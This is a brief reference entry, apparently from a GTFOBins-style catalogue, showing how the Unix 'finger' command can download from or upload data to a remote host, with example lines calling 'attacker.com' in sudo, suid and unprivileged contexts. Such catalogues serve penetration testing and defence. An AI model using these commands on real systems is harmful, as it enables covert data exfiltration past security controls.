---
type: gtfobin
name: finger
platform: Unix
functions: [download, upload]
tags: [gtfobin, unix, lotl]
---

# finger

## download

```bash
finger x@attacker.com
```
_The command hangs waiting for the remote peer to close the socket._
**Contexts:** sudo, suid, unprivileged

## upload

```bash
finger DATA@attacker.com
```
_The command hangs waiting for the remote peer to close the socket._
**Contexts:** sudo, suid, unprivileged
